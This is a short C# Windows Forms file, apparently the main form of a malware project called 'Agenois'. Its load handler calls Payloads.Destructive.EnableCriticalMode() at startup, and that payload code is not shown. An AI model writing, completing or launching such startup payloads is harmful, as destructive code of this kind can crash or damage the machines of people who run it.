using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Agenois
{
    public partial class MainThread : Form
    {
        public MainThread()
        {
            InitializeComponent();
        }

        private void MainThread_Load(object sender, EventArgs e)
        {
            //Everything on startup.
            Payloads.Destructive.EnableCriticalMode();
        }
    }
}
